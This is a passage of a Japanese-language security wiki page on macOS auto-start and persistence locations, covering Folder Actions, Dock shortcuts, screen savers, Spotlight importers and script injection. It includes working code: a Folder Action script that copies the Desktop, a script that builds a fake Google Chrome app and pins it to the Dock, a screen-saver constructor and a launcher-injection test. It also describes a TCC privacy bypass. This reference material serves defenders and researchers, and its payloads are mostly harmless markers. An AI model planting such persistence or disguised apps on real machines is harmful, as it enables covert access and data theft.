-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

ファイル名にはキュー、ジョブ番号、実行予定時刻が含まれています。例として `a0001a019bdcd2` を見てみましょう。

- `a` - キューです
- `0001a` - 16進数のジョブ番号です。`0x1a = 26`
- `019bdcd2` - 16進数の時刻です。epoch からの経過分数を表します。`0x019bdcd2` は10進数で `26991826` です。これに60を掛けると `1619509560` となり、`GMT: 2021年4月27日 火曜日 7:46:00` です。

ジョブファイルを出力すると、`at -c` で取得したものと同じ情報が含まれていることがわかります。

### Calendar のファイルを開くアラート

- **書き込み先:** Calendar イベントのカスタム **ファイルを開く** アラートですでに選択されている実行可能なアプリバンドル、または別のファイル。アラート自体の作成や編集には、Calendar または承認済みのカレンダーデータソースを通じて、そのカレンダーイベントにアクセスする必要があります。無関係なファイルへの書き込みではアラートは作成されません。
- **トリガー:** Calendar がイベントを処理する Mac での、アラートの予定時刻です。繰り返しイベントでは、この動作も繰り返されることがあります。[Apple の現行 Calendar ガイド](https://support.apple.com/guide/calendar/icl1012/mac)では、macOS 26 の **カスタム → ファイルを開く** アラートオプションが確認できます。
- **実行ユーザーと制限:** Calendar は、選択されたファイルをサインイン中のユーザーとして、関連付けられたアプリケーションで開きます。アプリバンドルを起動すると、そのユーザーとしてコードが実行されることがありますが、Gatekeeper、quarantine、その他の macOS チェックが適用されます。通常のスクリプトファイルはエディタで開くだけの場合もあり、拡張子だけではコードが実行されるとは判断できません。

候補を安全に評価するには、Calendar でイベントのアラートと選択されたファイルの権限を確認してください。この方法は Apple のガイドに基づいて記載したもので、実際のカレンダーを変更してデスクトップイベントを待つ必要があるため、調査用 Mac では実行していません。使い捨てアカウントで、マーカーのみを含むアプリバンドルを選択し、近い将来の「ファイルを開く」アラートを設定して起動を確認した後、イベントとアプリを削除してテストできます。

### macOS の Shortcuts オートメーション

- **書き込み先:** ショートカットのアクションですでに参照されている実行可能ファイル、または権限を持つユーザーが編集できる既存のショートカットです。無関係な `.shortcut` ファイルや、文書化されていない Shortcuts データベースへの書き込みは、サポートされたオートメーション登録方法ではありません。
- **トリガーと実行ユーザー:** 時刻やアプリイベントなど、事前に設定され有効化されたオートメーションイベントが、サインイン中のユーザーとしてショートカットを実行します。[Apple の現行 Mac オートメーションガイド](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac)には、対応イベント、「確認なしで実行」できる条件、およびトリガーの削除方法が記載されています。[Apple の Shortcuts プライバシーガイド](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac)によると、スクリプトアクションには **スクリプトの実行を許可** が必要で、個々のアクションが引き続き権限を要求することもあります。

これは、既存のアクションが書き込み可能なターゲットを読み込む場合に限る、条件付きの書き込みから実行への経路です。UI から新しいオートメーションを作成すると実際の設定が変更されるため、調査用 Mac では試していません。使い捨てアカウントでは、所有者が時刻指定のショートカットを設定し、そのスクリプトで `/tmp/ht-shortcuts-marker` に触れるようにできます。必要な権限を有効にし、イベント後にマーカーを確認してから、オートメーション、ショートカット、マーカーを削除します。

### Automator アクションと Quick Actions

- **書き込み先:** アクションバンドル用の `~/Library/Automator/*.action`（ユーザー）および `/Library/Automator/*.action`（管理者）。保存された Quick Action ワークフローは通常 `~/Library/Services/*.workflow` に保存されます。ユーザーが選択した実際のワークフローのパスを確認してください。[Apple の Automator フレームワークリファレンス](https://developer.apple.com/documentation/automator)には、アクションの検索ディレクトリが記載されています。
- **トリガー:** Automator は起動時に利用可能なアクションバンドルを読み込みますが、アクションのタスクが実行されるのは、それを使用するワークフローが実行されたときです。Quick Action は、ユーザーが Finder、Services、またはその他の表示メニューから選択すると実行されます。Folder Action ワークフローは、**すでに関連付けられている**フォルダに項目が追加されたときに実行され、Calendar Alarm ワークフローはイベント時刻に実行されます。[Apple のワークフロータイプ](https://support.apple.com/guide/automator/aut7cac58839/mac)では、これらのイベントが区別されています。アクションやワークフローを書き込むだけでは、フォルダとの関連付けやカレンダーイベントのスケジュール設定は行われません。
- **実行ユーザーと制限:** ワークフローを実行するアカウントです。Automator または呼び出し元のアプリがアクションを読み込み、現在のコード署名やプライバシーチェックなどで許可される必要があります。有効なワークフローからすでに参照されている書き込み可能なアクションバンドルは、新しいアクションをインストールして選択されるのを待つケースとは異なります。

macOS 26.5.2 のテスト用 Mac には、ユーザーの `Automator` および `Services` ディレクトリが存在していましたが、`/Library/Automator` はありませんでした。実際のワークフローは作成、関連付け、実行していません。特定の読み込み経路を確認するには、使い捨てアカウントでマーカーのみを使ったアクション／ワークフローを使用してください。このイベントソースについては、別の [Folder Actions](#folder-actions) セクションで詳しく説明しています。

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- sandbox のバイパスに有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、Folder Actions を設定するには、**`System Events`** に接続するための引数を付けて `osascript` を呼び出せる必要があります
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Desktop、Documents、Downloads など、基本的な TCC 権限があります

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
  - root 権限が必要
  - **トリガー**: 指定フォルダへのアクセス
- **`~/Library/Scripts/Folder Action Scripts`**
  - **トリガー**: 指定フォルダへのアクセス

#### Description & Exploitation

Folder Actions は、項目の追加や削除、フォルダウィンドウを開く・サイズ変更するといった操作など、フォルダ内の変更によって自動的に実行されるスクリプトです。さまざまなタスクに利用でき、Finder UI やターミナルコマンドなど、異なる方法でトリガーできます。<sup>[[17]](#references)[[18]](#references)</sup>

Folder Actions を設定するには、次のような方法があります。

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) で Folder Action ワークフローを作成し、サービスとしてインストールする。
2. フォルダのコンテキストメニューにある Folder Actions Setup から、スクリプトを手動で関連付ける。
3. OSAScript を使用し、`System Events.app` に Apple Event メッセージを送信して、Folder Action をプログラムで設定する。
   - この方法は、アクションをシステムに組み込んで、ある程度の永続性を実現するのに特に有用です。

次のスクリプトは、Folder Action で実行できるものの例です。

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

上記のスクリプトを Folder Actions で使用できるようにするには、次のコマンドでコンパイルします:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

スクリプトをコンパイルしたら、以下のスクリプトを実行してFolder Actionsを設定します。このスクリプトはFolder Actionsをシステム全体で有効にし、コンパイル済みのスクリプトをDesktopフォルダに関連付けます。

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

次のコマンドでセットアップスクリプトを実行します:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- GUI経由でこの persistence を実装する方法は次のとおりです：

実行されるスクリプトは次のとおりです：

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

次のコマンドでコンパイルします: `osacompile -l JavaScript -o folder.scpt source.js`

次の場所に移動します:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

次に、`Folder Actions Setup` appを開き、**監視したいフォルダ**を選択して、この場合は **`folder.scpt`** を選択します（私の場合はoutput2.scpという名前にしました）:

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

これで、そのフォルダを**Finder**で開くと、スクリプトが実行されます。

この設定は、base64形式で **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** にある **plist** に保存されていました。

それでは、GUIアクセスなしでこの永続化を設定してみましょう:

1. バックアップのため、**`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** を `/tmp` にコピーします:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. 先ほど設定したFolder Actionsを**削除**します:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

これで環境が空になったので、

3. バックアップファイルをコピーします: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Folder Actions Setup.appを開いて、この設定を読み込みます: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> 私の場合はうまくいきませんでしたが、writeupにある手順は以上です:(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- sandboxのbypassに有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、悪意のあるアプリケーションをシステム内にインストールしておく必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
  - **Trigger**: ユーザーがDock内のアプリをクリックしたとき

#### Description & Exploitation

Dockに表示されるすべてのアプリケーションは、plist **`~/Library/Preferences/com.apple.dock.plist`** 内で指定されています<sup>[[19]](#references)</sup>

**アプリケーションを追加**するには、次のようにします:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

**social engineering**を使えば、Dock 内でたとえば Google Chrome に偽装し、実際に自分のスクリプトを実行できます。

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### 入力メソッド

- **書き込み先:** `~/Library/Input Methods/`（ユーザー）または `/Library/Input Methods/`（管理者）にインストールされた、コードを含む入力メソッドアプリバンドル。これは、任意のコードを含むペイロードではない、Appleのプレーンテキストの `.inputplugin` キーボードマッピングファイルとは異なります。
- **トリガー:** ユーザーが **システム設定 → キーボード → テキスト入力** で入力ソースを追加／有効化し、その後選択または使用します。バンドルをディレクトリにコピーしただけでは、macOSが起動する証拠にはなりません。[Appleの最新の入力ソースガイド](https://support.apple.com/guide/mac-help/mchl84525d76/mac)ではソースの有効化と切り替えについて説明されており、[AppleのInputMethodKitドキュメント](https://developer.apple.com/documentation/inputmethodkit)ではコードを含む入力メソッドについて説明されています。
- **実行時のIDと制限:** このメソッドはサインイン中のユーザーとして実行されますが、入力メソッドの登録、コード署名、現在のmacOSセキュリティチェックが適用されます。既存の有効なメソッドの実行ファイルに書き込み可能な場合は、別途、パスと署名を確認する必要があります。

Appleの[以前のサードパーティ製入力メソッドに関する注意書き](https://developer.apple.com/library/archive/qa/qa1810/_index.html)では、特定のパレットメソッドをこれらのディレクトリにコピーしても、入力ソースに表示すらされないことがすでに警告されていました。macOS 26.5.2を使用した調査用Macでは、ユーザーディレクトリは存在しますが、バンドルはインストールも有効化もされていません。そのため、これはローカルでの実行結果ではなく、条件付きのパスとして記載しています。

### カラーピッカー

解説記事: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- sandboxのバイパスに有用: [🟠](https://emojipedia.org/large-orange-circle)
  - 非常に特定の操作が必要
  - 別のsandboxに入ることになる
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `/Library/ColorPickers`
  - root権限が必要
  - トリガー: カラーピッカーを使用する
- `~/Library/ColorPickers`
  - トリガー: カラーピッカーを使用する

#### 説明とエクスプロイト

コードを含む**カラーピッカー**バンドルをコンパイルし（例として[**こちら**](https://github.com/viktorstrate/color-picker-plus)を使用できます）、[スクリーンセーバーのセクション](macos-auto-start-locations.md#screen-saver)のようにコンストラクターを追加して、バンドルを `~/Library/ColorPickers` にコピーします。<sup>[[20]](#references)</sup>

その後、カラーピッカーが起動されると、バンドルも実行されるはずです。

この方法は、互換性のあるアプリがシステムのカラーパネルを開き、インストール済みのピッカーを選択することが条件です。[Appleのカラーパネルガイド](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html)では、従来のバンドルの場所について説明されています。ローカルでパスを確認したところ、従来のカラーピッカーXPCサービスは見つかりましたが、調査用Macにはピッカーがインストールも読み込みもされていませんでした。パスだけを根拠にTCC bypassが可能だと判断しないでください。

ライブラリを読み込むバイナリには**非常に制限の厳しいsandbox**が設定されています: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync プラグイン

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- sandbox bypassに有用: **いいえ。自分のアプリを実行する必要があるため**
- TCC bypass: 有効化されているextensionのsandboxと権限によります。一般的なbypassは確認されていません。

#### 場所

- 特定のアプリ

#### 説明とExploit

Finder Sync Extensionを備えたアプリの例は[**こちらで確認できます**](https://github.com/D00MFist/InSync)。

アプリには`Finder Sync Extensions`を含めることができます。このextensionは、実行されるアプリ内に配置されます。さらに、extensionがコードを実行するには、有効なApple developer certificateで**署名**され、**sandbox化**されている必要があります（緩和された例外を追加することは可能です）。また、次のような方法で登録する必要があります:<sup>[[21]](#references)[[22]](#references)</sup>

インストール済みのextensionも、関連するFinderの場所または項目に対して**有効化**され、呼び出される必要があります。任意の`.appex` bundleを書き込むだけでは不十分です。[AppleのFinder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled)では、有効状態を確認できます。以下の`pluginkit`コマンドは、明示的な登録と有効化の例であり、ファイルを置くだけで自動起動する方法ではありません。この方法はドキュメントを確認したもので、調査用Macに新しいextensionをインストールまたは有効化していません。

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### スクリーンセーバー

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- sandbox のバイパスに有用: [🟠](https://emojipedia.org/large-orange-circle)
  - ただし、一般的な application sandbox 内で実行されます
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `/System/Library/Screen Savers`
  - root 権限が必要
  - **トリガー**: スクリーンセーバーを選択
- `/Library/Screen Savers`
  - root 権限が必要
  - **トリガー**: スクリーンセーバーを選択
- `~/Library/Screen Savers`
  - **トリガー**: スクリーンセーバーを選択

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 説明と Exploit

Xcode で新しいプロジェクトを作成し、新しい **Screen Saver** を生成するテンプレートを選択します。次に、コードを追加します。たとえば、以下のコードを使ってログを生成できます。<sup>[[23]](#references)[[24]](#references)</sup>

**Build** し、`.saver` バンドルを **`~/Library/Screen Savers`** にコピーします。次に、スクリーンセーバーの GUI を開いてクリックするだけで、多数のログが生成されるはずです。

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> このコードを読み込むバイナリ（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）のentitlements内に **`com.apple.security.app-sandbox`** が含まれているため、**一般的なアプリケーションのsandbox内で実行される**ことに注意してください。

スクリーンセーバーのコード:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlightプラグイン

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- sandboxのバイパスに有用: [🟠](https://emojipedia.org/large-orange-circle)
  - ただし、最終的にはアプリケーションのsandbox内に入ります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - sandboxは非常に制限されています

#### 場所

- `~/Library/Spotlight/`
  - **トリガー**: Spotlightプラグインが処理する拡張子の新しいファイルが作成される。
- `/Library/Spotlight/`
  - **トリガー**: Spotlightプラグインが処理する拡張子の新しいファイルが作成される。
  - root権限が必要
- `/System/Library/Spotlight/`
  - **トリガー**: Spotlightプラグインが処理する拡張子の新しいファイルが作成される。
  - root権限が必要
- `Some.app/Contents/Library/Spotlight/`
  - **トリガー**: Spotlightプラグインが処理する拡張子の新しいファイルが作成される。
  - 新しいアプリが必要

#### 説明と悪用

SpotlightはmacOSに組み込まれた検索機能で、ユーザーが**コンピューター上のデータにすばやく、網羅的にアクセスできる**ように設計されています。\
この高速検索機能を実現するため、Spotlightは**独自のデータベース**を維持し、**ほとんどのファイルを解析して**インデックスを作成することで、ファイル名とファイル内容の両方をすばやく検索できるようにします。<sup>[[25]](#references)</sup>

Spotlightの基盤となる仕組みは、「metadata server」を意味する「mds」という名前の中央プロセスです。このプロセスがSpotlightサービス全体を統括します。これを補完する複数の「mdworker」デーモンが、さまざまなファイル形式のインデックス作成など、各種の保守タスクを実行します（`ps -ef | grep mdworker`）。こうしたタスクはSpotlight importerプラグイン、つまり**「.mdimporter bundle」**によって実現されます。これにより、Spotlightは多種多様なファイル形式の内容を理解し、インデックスを作成できます。

プラグイン、つまり**`.mdimporter`** bundleは前述の場所にあります。新しいbundleが検出され、ファイル形式に一致し、さらにSpotlightが実際に一致するファイルをインデックス化する必要があります。bundleをコピーしただけでは、読み込まれたことの証明にはなりません。[AppleのMDImporterリファレンス](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter)によると、読み込みは対象となる変更済みファイルに関連付けられています。macOS 26でのSpotlight importerの実行は、ここではテストしていません。

実行中に読み込まれている`mdimporters`をすべて**確認できます**:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

また、たとえば **/Library/Spotlight/iBooksAuthor.mdimporter** は、これらの種類のファイル（拡張子 `.iba` や `.book` など）を解析するために使用されます。

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> 他の `mdimporter` の Plist を確認しても、**`UTTypeConformsTo`** の項目が見つからないことがあります。これは組み込みの _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) であり、拡張子を指定する必要がないためです。
>
> さらに、システム標準のプラグインが常に優先されるため、攻撃者がアクセスできるのは、Apple 独自の `mdimporter` でインデックス化されないファイルに限られます。

独自の importer を作成するには、次のプロジェクトをベースにできます: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer)。その後、名前と **`CFBundleDocumentTypes`** を変更し、対応させたい拡張子をサポートするために **`UTImportedTypeDeclarations`** を追加して、**`schema.xml`** に反映します。\
続いて、**`GetMetadataForFile`** 関数のコードを**変更**し、処理対象の拡張子を持つファイルが作成されたときに payload を実行するようにします。

最後に、新しい **`.mdimporter` をビルドして、先ほどの3つの場所のいずれかにコピーします**。**ログを監視する**か、**`mdimport -L`** を実行して、ロードされたかどうかを確認できます。

> [!TIP]
> importer の sandbox は非常に制限が厳しいものの、`mdworker` は**特権付きの読み取りアクセス**でファイルをインデックス化します。そのため、悪意のある `.mdimporter` は TCC で保護された場所（Downloads、Pictures、Desktop、…）にあるファイルの*内容*を読み取り、TCC プロンプトなしで取得したメタデータを流出させることができます。これは **「Sploitlight」TCC bypass（CVE-2025-31199）** と呼ばれ、macOS Sequoia 15.4 で修正されました。<sup>[[55]](#references)</sup>

システムログではなく **Darwin notification 名**に保護対象のバイト列を含める、macOS 26 の別の手法については、[Darwin notification 名を介した Spotlight importer leakage](macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/#spotlight-importer-leakage-via-darwin-notification-names) を参照してください。<sup>[[57]](#references)</sup>

### ~~Preference Pane~~

> [!CAUTION]
> これはもう機能していないようです。

解説: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
  - 特定のユーザー操作が必要です
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

これはもう機能していないようです。<sup>[[26]](#references)</sup>

### Application Script Files

解説: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、対象のアプリケーションがインストールされており、被害者が実行または使用する必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

インストール済みのアプリケーションまたはツールが実際に実行する**インタープリター型スクリプト**で、攻撃者が変更できるものです。ファイルの権限と呼び出し元のパスを確認してください。`.sh` や `.py` ファイルが見つかっただけでは不十分です。Apple の[コード署名ガイド](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html)によると、署名済みアプリバンドルはスクリプトを含むリソースを封印します。バンドル内のスクリプトを編集すると封印が破られ、バンドルの検証時に検出またはブロックされる可能性があります。Homebrew の launcher などの外部スクリプトでは、署名や信頼の扱いが異なります。解説に含まれる過去の例は次のとおりです。

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – 旧バージョンの Sublime Text で使用されていたスクリプトです。インストールされているバージョンで、ファイルの有無と起動時に使用されるかを確認してください。テスト用 Mac にはありませんでした。
- **`/opt/homebrew/bin/brew`**（Apple Silicon）または **`/usr/local/bin/brew`**（Intel）– インストールされていて攻撃者が書き込み可能な場合、該当する `brew` パスが呼び出されたときに実行される Bash launcher です。テスト用 Mac では `/opt/homebrew/bin/brew` は書き込み可能な Bash スクリプトでした。これはその環境での観察結果であり、Homebrew 全般の権限を示すものではありません。
- Python アプリバンドル内の IDLE の `idlemain.py` – 書き込みに管理者権限が必要な場合がありますが、IDLE ユーザーの権限で実行されます。
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – 対応する `org.wireshark.ChmodBPF` launchd ジョブがインストールされている場合に root で実行される、過去のシェルスクリプトです。テスト用 Mac にはスクリプトもジョブもありませんでした。

#### Description & Exploitation

一部のツールやアプリは、実行時にインタープリター型スクリプトを実行します。書き込み可能なスクリプトにコマンドを追加すると、署名検証、quarantine、その他のチェックで許可される限り、次に該当する呼び出し元が実行されたときにそのコマンドを実行できます。元の調査では、2019年時点の複数のインストール環境で実証されました。対象のバージョンでパスと実行条件を再確認してください。<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

このコピーのテストでは、macOS 26.5.2で`marker fired: True`が確認されました。元のlauncherには手を加えていません。これは、コピー内で挿入ポイントが実行されることを示すものであり、署名済みアプリバンドルを改変した場合や、実際のHomebrewインストールで、すべての起動チェックを通過することを示すものではありません。

### Dock Tileプラグイン

解説: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- sandbox bypassに有用: [✅](https://emojipedia.org/check-mark-button)
  - プラグインを宣言するアプリがDockによって検出・登録され、処理される必要がある
  - プラグインは、app-sandbox entitlementがなく、library validationが無効になっている**Apple署名済み**のhelperに読み込まれます。引用した調査では、このhelperはBackground Task Management UIに表示されていませんでした。対象のリリースで表示されるかどうかは確認が必要です。
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**。アプリの`Info.plist`にある**`NSDockTilePlugIn`**キーで参照されます。プラグイン自身の`Info.plist`では**`NSPrincipalClass`**を設定します。

#### 説明とExploit

